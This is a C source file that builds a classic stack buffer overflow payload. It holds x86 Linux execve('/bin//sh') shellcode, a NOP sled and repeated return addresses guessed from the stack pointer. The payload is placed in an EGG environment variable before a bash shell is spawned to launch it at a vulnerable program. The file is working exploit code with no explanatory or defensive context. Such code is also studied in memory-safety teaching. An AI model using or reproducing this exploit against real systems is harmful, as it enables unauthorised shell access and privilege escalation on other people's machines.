#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90

char shellcode[]=
		"\x31\xc0"             /* xorl    %eax,%eax              */
		"\x50"                 /* pushl   %eax                   */
		"\x68""//sh"           /* pushl   $0x68732f2f            */
		"\x68""/bin"           /* pushl   $0x6e69622f            */
		"\x89\xe3"             /* movl    %esp,%ebx              */
		"\x50"                 /* pushl   %eax                   */
		"\x53"                 /* pushl   %ebx                   */
		"\x89\xe1"             /* movl    %esp,%ecx              */
		"\x99"                 /* cdql                           */
		"\xb0\x0b"             /* movb    $0x0b,%al              */
		"\xcd\x80"             /* int     $0x80                  */
		;

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"EGG=",4);
  putenv(buff);
  system("/bin/bash");
}
